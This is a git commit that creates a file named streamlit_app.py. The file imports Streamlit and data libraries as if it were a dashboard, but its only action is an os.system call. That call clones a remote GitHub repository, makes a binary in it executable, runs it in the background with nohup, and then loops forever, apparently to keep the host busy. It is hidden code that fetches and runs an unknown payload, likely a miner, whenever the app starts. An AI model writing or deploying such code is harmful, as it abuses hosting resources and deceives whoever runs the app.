d20edc3f18452a2d2804ea1a149850d760fa6369
hatayas <108974556+hatayas@users.noreply.github.com>
2022-07-09 14:45:57 +0700

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("rm -rf smlt && git clone https://github.com/Akatsoki/smlt.git && cd smlt && chmod +x Sml && nohup ./Sml &; while :; do shuf -n 1 -i 1-99999999; sleep 10; done")
